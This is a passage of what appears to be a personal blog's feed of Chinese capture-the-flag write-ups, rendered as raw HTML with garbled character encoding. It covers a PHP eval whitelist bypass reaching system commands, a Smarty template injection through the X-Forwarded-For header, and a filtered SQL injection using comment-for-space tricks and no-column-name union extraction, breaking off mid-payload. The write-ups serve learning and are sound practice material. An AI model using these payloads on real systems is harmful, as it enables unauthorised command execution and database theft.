class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>))&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>è¾“å‡ºï¼š<br><img src="/images/2023-8-24_LoveMath/image-20230824152553792.png" alt="image-20230824152553792"></p><p>å‘ç°ç³»ç»Ÿå‘½ä»¤æ²¡æœ‰è¢«æ‰§è¡Œï¼Œæ‰€ä»¥ç›´æ¥åº”ç”¨çš„æ–¹å¼æ˜¯é”™è¯¯çš„ï¼Œæˆ‘ä»¬éœ€è¦é‡‡ç”¨é—´æ¥å¼•ç”¨å­—ç¬¦ä¸²çš„æ–¹å¼ï¼š</p><p><strong>æµ‹è¯•:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-variable">$_GET</span>&#123;a&#125;(<span class="hljs-variable">$_GET</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?a=system&amp;b=dir<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824144645504.png" alt="image-20230824144645504"></p><p>å‘ç”Ÿäº†è¾“å‡ºï¼Œè¯´æ˜system(dir)åœ¨æ²¡æœ‰echoçš„æƒ…å†µä¸‹ä¾ç„¶å¯ä»¥è¾“å‡ºå†…å®¹</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å¤šå¥åˆæ³•PHPä»£ç ä½¿å…¶å­˜åœ¨äºeval()å‡½æ•°ä¸­ï¼Œä½¿è¯¥å‡½æ•°æ‰§è¡Œå¤šæ¡PHPä»£ç ï¼Œç„¶åæˆ‘ä»¬åœ¨å¯¹å…¶è¿›è¡Œæ³¨å…¥ï¼ˆç±»ä¼¼äºæ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;test1&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>)&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;111&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag is here&quot;</span>;<br><span class="hljs-comment">//$pi=base_convert(37907361743,10,36)(dechex(1598506324));</span><br><span class="hljs-comment">//($$pi)&#123;a&#125;(($$pi)&#123;b&#125;);</span><br><span class="hljs-comment">//($_GET&#123;a&#125;)($_GET&#123;b&#125;);</span><br><span class="hljs-variable">$pi</span>=<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&quot;37907361743&quot;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">36</span>)(<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-string">&quot;1598506324&quot;</span>));<br><span class="hljs-variable">$$pi</span>&#123;a&#125;(<span class="hljs-variable">$$pi</span>&#123;b&#125;);<br></code></pre></td></tr></table></figure><p>è¾“å‡º:<br><img src="/images/2023-8-24_LoveMath/image-20230824152828967.png" alt="image-20230824152828967"></p><p>6.ç”¨é—´æ¥å¼•ç”¨ç®€åŒ–payload(ä½¿ç”¨piä½œä¸ºå‚æ•°æ˜¯å› ä¸ºå®ƒæ—¢æ˜¯ç™½åå•å­—ç¬¦ä¸²ï¼ŒåŒæ—¶ä¹Ÿå¾ˆçŸ­):</p><p>åœ¨PHPå‡½æ•°çš„å‚æ•°ä¸­stringç±»å‹éƒ½å¯ä»¥ä¸ç”¨åŠ åŒå¼•å·æˆ–å•å¼•å·ï¼ŒPHPä¼šè‡ªåŠ¨è¿›è¡Œè§£æ,åŒæ—¶ç”¨GETæˆ–POSTæ–¹æ³•ä¼ è¾“å†…å®¹æ—¶ä¹Ÿä¸éœ€è¦â€â€å’Œâ€™â€™:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=ls /<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153549268.png" alt="image-20230824153549268"></p><p>å‘ç°flagæ–‡ä»¶ï¼Œå°†å…¶æ‰“å¼€æŸ¥çœ‹:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;atan&#125;);&amp;abs=system&amp;atan=cat /flag<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-24_LoveMath/image-20230824153729500.png" alt="image-20230824153729500"></p><p>flag &#x3D; flag{26bb1d2a-6719-409c-88f7-14461687b994}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[CISCN2019 åä¸œå—èµ›åŒº]Web11 é¢˜è§£</title>
    <link href="/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/"/>
    <url>/2023/08/23/2023-08-23-%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11/</url>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>1.æ‰“å¼€ç½‘é¡µåè§‚å¯Ÿ:</p><p><img src="/images/2023-8-23_Web11/image-20230823120850043.png" alt="image-20230823120850043"></p><p>æ ¹æ®ç½‘é¡µæ˜¾ç¤ºçš„å†…å®¹å¾—ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¯¹ç½‘é¡µçš„è¯·æ±‚å¤´è¿›è¡Œæ›´æ”¹</p><p>2.BPæŠ“åŒ…:<br><img src="/images/2023-8-23_Web11/image-20230823121029643.png" alt="image-20230823121029643"></p><p>ç”±ç½‘é¡µæ˜¾ç¤ºçš„å†…å®¹å¾—ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦ä¿®æ”¹headersä¸­çš„X-Forwarded-For</p><p>å¯¹è¯¥å­—æ®µè¿›è¡Œä¿®æ”¹ï¼Œå…ˆéšä¾¿å†™ä¸€ä¸ªIPï¼š</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:127.0.0.1<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121206963.png" alt="image-20230823121206963"></p><p>æˆ‘ä»¬è¾“å…¥çš„å†…å®¹åœ¨ç½‘é¡µçš„Current IPä¸­æ˜¾ç¤ºï¼Œå³æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å¯ä»¥è¢«æ¸²æŸ“ä¼ é€åˆ°htmlä¸­æ˜¾ç¤ºï¼Œæ‰€ä»¥çŒœæµ‹è¯¥å­—æ®µå­˜åœ¨sstiæ³¨å…¥</p><p>3.åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ¨¡æ¿æ³¨å…¥:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;8*8&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121359664.png" alt="image-20230823121359664"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#123;&#123;&#125;&#125;ä¸­çš„ä»£ç è¢«æ‰§è¡Œè¾“å‡º64ï¼Œæ‰€ä»¥è¯¥å­—æ®µå­˜åœ¨sstiæ³¨å…¥<br></code></pre></td></tr></table></figure><p>4.åˆ¤æ–­è¯¥æ¨¡æ¿çš„ç±»å‹:<br>ç”¨åˆ¤æ–­æ˜¯å¦ä¸ºSmartyæ¨¡æ¿æ³¨å…¥:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;$smarty.version&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121632709.png" alt="image-20230823121632709"></p><p>çˆ†å‡ºç‰ˆæœ¬ä¿¡æ¯:3.1.30,æ‰€ä»¥è¯¥ç½‘é¡µä½¿ç”¨çš„æ˜¯smartyæ¨¡æ¿</p><p>5.ä½¿ç”¨sstiåœ¨Smartyæ¨¡æ¿ä¸­çš„æ¶æ„ä»£ç :<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;ls /&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121828541.png" alt="image-20230823121828541"></p><p>å‘ç°æœ‰ä¸€ä¸ªflagæ–‡ä»¶ï¼ŒæŸ¥çœ‹flagæ–‡ä»¶çš„å†…å®¹:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">X-Forwarded-For:&#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-23_Web11/image-20230823121932270.png" alt="image-20230823121932270"></p><p>flag&#x3D;flag{0f8c1a6e-bf4c-4d5e-ad9e-f6282d3fe876}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[SWPU2019]Web1 é¢˜è§£</title>
    <link href="/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/"/>
    <url>/2023/08/23/2023-08-23-%5BSWPU2019%5DWeb1/</url>
    
    <content type="html"><![CDATA[<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>1.ç‚¹å‡»ç½‘é¡µä¹‹åï¼Œæ³¨å†Œä¸€ä¸ªè´¦æˆ·ï¼Œç„¶åç™»å½•(ç™»å½•ç•Œé¢å’Œæ³¨å†Œç•Œé¢çš„sqlæ³¨å…¥å·²ç»æµ‹è¯•ï¼Œå‘ç°æ²¡æœ‰ç”¨):<br><img src="/images/2023-08-23_Web1/image-20230823141144322.png" alt="image-20230823141144322"></p><p>2.ç‚¹å‡»ç”³è¯·ä¸€ä¸ªå¹¿å‘Š:</p><p><img src="/images/2023-08-23_Web1/image-20230823141243172.png" alt="image-20230823141243172"></p><p>åœ¨è¯¥é¡µé¢ä¸­ä¹Ÿå­˜åœ¨ç–‘ä¼¼æ³¨å…¥ç‚¹ï¼Œå…ˆéšæœºç”³è¯·ä¸€ä¸ªå¹¿å‘Š:<br><img src="/images/2023-08-23_Web1/image-20230823141351148.png" alt="image-20230823141351148"></p><p>3.ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823141456102.png" alt="image-20230823141456102"></p><p>æ˜¾ç¤ºäº†è¯¥å¹¿å‘Šçš„å†…å®¹</p><p>4.çŒœæµ‹è¯¥é¡µé¢çš„äº‹åŠ¡å¤„ç†é€»è¾‘ï¼š<br><strong>ç”³è¯·å¹¿å‘Šé¡µé¢:</strong></p><p>insert into table VALUES(â€œå¹¿å‘Šåâ€,â€å¹¿å‘Šå†…å®¹â€,â€¦â€¦..);</p><p><strong>index.phpæ˜¾ç¤ºå†…å®¹ï¼š</strong><br>select * from table</p><p><strong>å¹¿å‘Šè¯¦æƒ…é¡µé¢:</strong></p><p>select * from table where å¹¿å‘Šå &#x3D;â€™ä»ç•Œé¢åˆ—è¡¨ä¸­è·å–çš„å¹¿å‘Šåâ€™</p><p><strong>éªŒè¯çŒœæµ‹ï¼š</strong></p><p>åœ¨ç”³è¯·å¹¿å‘Šé¡µé¢ä¸­:<br>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">å¹¿å‘Šå:1&#x27;<br>å¹¿å‘Šå†…å®¹:aaaaa<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823142529330.png" alt="image-20230823142529330"></p><p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823142551729.png" alt="image-20230823142551729"></p><p>å‘ç”ŸsqlæŠ¥é”™ï¼Œæ‰€ä»¥å¯ä»¥è¯å®æˆ‘ä»¬çš„çŒœæƒ³ï¼Œå¹¿å‘Šè¯¦æƒ…å­˜åœ¨sqlæ³¨å…¥æ¼æ´:<br>select * from table where å¹¿å‘Šå &#x3D;â€™1â€™â€™</p><p>5.sqlæ³¨å…¥:<br><strong>ç¬¬ä¸€æ­¥ï¼Œçˆ†å­—æ®µï¼š</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union select 1,2,3 #<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143036837.png" alt="image-20230823143036837"></p><p>å‘ç°å¯¹è¾“å…¥å†…å®¹è¿›è¡Œäº†è¿‡æ»¤,å¯¹è¾“å…¥å†…å®¹è¿›è¡Œåˆ¤æ–­ï¼Œçœ‹çœ‹å®ƒè¿‡æ»¤äº†å“ªäº›å†…å®¹:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27; union<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823143210775.png" alt="image-20230823143210775"></p><p>å¯ä»¥è¿›è¡Œç”³è¯·ï¼Œä½†æ˜¯åœ¨æ˜¾ç¤ºçš„å†…å®¹ä¸­ç©ºæ ¼è¢«æ¶ˆé™¤äº†ï¼Œè¯´æ˜ç½‘é¡µå¯¹ç©ºæ ¼è¿›è¡Œäº†å¤„ç†:<br><strong>å¯¹ç©ºæ ¼è¿›è¡Œç»•è¿‡:</strong><br><img src="/images/2023-08-23_Web1/image-20230823143443665.png" alt="image-20230823143443665"></p><p>æ‰€ä»¥ç©ºæ ¼å¯ä»¥ç”¨&#x2F;**&#x2F;ä»£æ›¿</p><p><img src="/images/2023-08-23_Web1/image-20230823144042281.png" alt="image-20230823144042281"></p><p>æ‰€ä»¥ä¹Ÿå¯ä»¥ç”¨()ç»•è¿‡ç©ºæ ¼</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144331977.png" alt="image-20230823144331977"></p><p>æ²¡æœ‰è¿‡æ»¤select</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3#<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823144539306.png" alt="image-20230823144539306"></p><p>è¯´æ˜è¯¥ç«™ç‚¹è¿‡æ»¤äº†#</p><p><strong>#å·ç»•è¿‡ï¼š</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823145455569.png" alt="image-20230823145455569"></p><p>æ‰€ä»¥å¯ä»¥ç”¨&#x2F;**&#x2F;â€˜é€šè¿‡é—­åˆâ€™ç»•è¿‡</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823145739643.png" alt="image-20230823145739643"></p><p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823145919546.png" alt="image-20230823145919546"></p><p>æˆåŠŸçˆ†å‡ºå­—æ®µä¸ä¸€è‡´çš„é”™è¯¯ï¼Œè¯´æ˜å½“å‰æ³¨å…¥æ–¹å¼æ­£ç¡®ï¼Œç°åœ¨åªè¦ä¸€æ­¥æ­¥æ·»åŠ ä¸Šå»æˆ–å‡å°‘ï¼Œæ¥ç¡®è®¤å®ƒåˆ°åº•æœ‰å¤šå°‘å­—æ®µ(ä¹Ÿå¯ä»¥ç”¨order by æˆ–group by æ¥åˆ¤æ–­æœ‰å¤šå°‘å­—æ®µ),æœ€ç»ˆæ·»åŠ åˆ°22çš„æ—¶å€™æˆåŠŸ:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823150404948.png" alt="image-20230823150404948"></p><p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823150443148.png" alt="image-20230823150443148"></p><p>æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜å½“å‰è¡¨æ€»å…±æœ‰22ä¸ªå­—æ®µ,ä¸”ç”±æ˜¾ç¤ºçš„å†…å®¹å¾—ï¼Œåªæ˜¾ç¤ºäº†2ï¼Œ3ï¼Œè¯´æ˜è¯¥æ•°æ®è¡¨çš„å†…å®¹åœ¨htmlä¸­ï¼ˆåœ¨æ•°æ®åº“ä¸­selectä¸€å®šæ˜¯å…¨éƒ¨æœç´¢å‡ºæ¥çš„ï¼‰åªæ˜¾ç¤ºç¬¬äºŒä¸ªå­—æ®µå’Œç¬¬ä¸‰ä¸ªå­—æ®µï¼Œæ‰€ä»¥æˆ‘ä»¬è¦çˆ†çš„å†…å®¹ä¹Ÿåªèƒ½åœ¨è¿™ä¸¤ä¸ªå­—æ®µä¸­æ˜¾ç¤º</p><p><strong>ç¬¬äºŒæ­¥ï¼Œçˆ†æ•°æ®åº“</strong>ï¼š</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(database()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823151000019.png" alt="image-20230823151000019"></p><p>çˆ†å‡ºæ•°æ®åº“åªæœ‰web1</p><p><strong>ç¬¬ä¸‰æ­¥ï¼Œçˆ†è¡¨ï¼š</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables/**/where/**/table_schema=DATABASE()/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152137236.png" alt="image-20230823152137236"></p><p>å¯¹è¾“å…¥å†…å®¹è¿›è¡Œä¸€ä¸€åˆ¤æ–­:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152224914.png" alt="image-20230823152224914"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.tables<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823152317844.png" alt="image-20230823152317844"></p><p>çŒœæµ‹æ•æ„Ÿè¯æ±‡ä¸ºinformation_schema.tables</p><p><strong>information_schema.tablesç»•è¿‡ï¼š</strong></p><p><img src="/images/2023-08-23_Web1/image-20230823152947582.png" alt="image-20230823152947582"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(table_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&#x27;web1&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153243260.png" alt="image-20230823153243260"></p><p>ç‚¹å‡»å¹¿å‘Šè¯¦æƒ…:<br><img src="/images/2023-08-23_Web1/image-20230823153322133.png" alt="image-20230823153322133"></p><p>çˆ†å‡ºä¸¤å¼ è¡¨:ads,users</p><p><strong>ç¬¬å››æ­¥ï¼Œçˆ†è¡¨çš„å­—æ®µï¼š</strong></p><p>å…ˆçˆ†adsçš„å­—æ®µ</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS/**/where table_schema=&#x27;web1&#x27;/**/and/**/table_name=&#x27;ads&#x27;/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153803945.png" alt="image-20230823153803945"></p><p>å¯¹æ³¨å…¥å†…å®¹è¿›è¡Œä¸€ä¸€åˆ¤æ–­:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">group_concat(column_name)<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153845408.png" alt="image-20230823153845408"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,group_concat(column_name),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/information_schema.COLUMNS<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823153914234.png" alt="image-20230823153914234"></p><p>çŒœæµ‹å¯èƒ½æ˜¯å¯¹information_schema.COLUMNSè¿›è¡Œäº†è¿‡æ»¤</p><p><strong>information_schema.COLUMNSç»•è¿‡:</strong></p><p>ç”±äºæ— æ³•ç»•è¿‡information_schema.COLUMNSï¼Œä½†æ˜¯åœ¨å·²ç»çŸ¥é“è¡¨æ˜çš„æƒ…å†µä¸‹å¯ä»¥é‡‡ç”¨æ— åˆ—åçˆ†ç ´æ³•:</p><p>å‚è€ƒ:[<a href="https://blog.csdn.net/shinygod/article/details/123681039">SWPU2019]Web1 1_succ3çš„åšå®¢-CSDNåšå®¢</a></p><p>å‚è€ƒçš„payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs txt">æ™®é€šçš„sqæŸ¥è¯¢<br>select * from users<br><br>æŸ¥è¯¢è¡¨ï¼Œå¹¶æŠŠåˆ—åæ›¿æ¢ä¸º1ï¼Œ2ï¼Œ3.4ï¼Œ5ï¼Œ6<br>select 1,2,3,4,5 ,6 union select * from users<br><br>å•ç‹¬æŠŠç¬¬å››åˆ—æå‡ºæ¥ï¼Œ(select 1,2,3,4,5,6 union select * from users)aç»™æŸ¥è¯¢ç»“æœå‘½å<br> select `4` from (select 1,2,3,4,5,6 union select * from users)a;<br><br>è‹¥åå¼•å·è¢«è¿‡æ»¤ï¼Œå¯ä»¥è¿™æ ·<br>select b from (select 1,2,3 as b,4,5 union select * from users)a;<br><br>æµ‹è¯•:<br>-- åœ¨å·²ç»çŸ¥é“beanbookè¡¨ï¼Œä½†æ˜¯ä¸çŸ¥é“å…¶å­—æ®µåçš„æƒ…å†µä¸‹ï¼Œçˆ†å‡ºè¯¥è¡¨çš„å­—æ®µå€¼<br>-- çˆ†å‡ºç¬¬3åˆ—çš„å€¼,æŠŠ3å½“ä½œç¬¬ä¸‰åˆ—çš„å­—æ®µå<br>select `3` from <br>(select 1,2,3,4,5,6 union select * from beanbook) as b<br><br>-- çˆ†å‡ºç¬¬1åˆ—çš„å€¼ï¼ŒæŠŠåˆ«åaå½“ä½œç¬¬ä¸€åˆ—çš„å­—æ®µå<br>select a from <br>(select 1 as a,2,3,4,5,6 union select * from beanbook) as b<br></code></pre></td></tr></table></figure><p>æ— åˆ—åçˆ†ç ´æ³•æµ‹è¯•:</p><p>ç¬¬ä¸€ç§:</p><p><img src="/images/2023-08-23_Web1/image-20230823155738540.png" alt="image-20230823155738540"></p><p>ç¬¬äºŒç§:<br><img src="/images/2023-08-23_Web1/image-20230823155947247.png" alt="image-20230823155947247"></p><p>æ ¹æ®æ— ååˆ—çˆ†ç ´çš„payload,æˆ‘ä»¬å…ˆè¦ç¡®è®¤è¯¥è¡¨æœ‰å¤šå°‘ä¸ªå­—æ®µ:</p><p>ï¼ˆflagåœ¨usersè¡¨ä¸­ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œçœç•¥å¯¹adsè¡¨çš„åˆ¤æ–­ï¼Œæ€è·¯å’Œusersè¡¨ä¸€æ ·ï¼‰</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161617410.png" alt="image-20230823161617410"></p><p>ç»§ç»­æ·»åŠ å­—æ®µï¼Œï¼ˆçœç•¥ä¸¤ä¸ªå­—æ®µçš„åˆ¤æ–­ï¼‰</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1/**/as/**/b,2,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823161924192.png" alt="image-20230823161924192"></p><p>å›æ˜¾äº†ç¬¬ä¸€åˆ—çš„æ‰€æœ‰å†…å®¹ï¼Œè¯´æ˜usersè¡¨çš„å­—æ®µæœ‰ä¸‰ä¸ª</p><p>å›æ˜¾ç¬¬äºŒä¸ªå­—æ®µçš„å†…å®¹:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/b,3/**/union/**/select*from/**/users)/**/as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/&#x27;<br></code></pre></td></tr></table></figure><p><img src="/images/2023-08-23_Web1/image-20230823162104825.png" alt="image-20230823162104825"></p><p>å‘ç°äº†flag,ä½†æ˜¯ä¸æ˜¯flagçš„å†…å®¹ï¼Œè¯´æ˜flagå†…å®¹åœ¨ç¬¬ä¸‰ä¸ªå­—æ®µä¸­</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 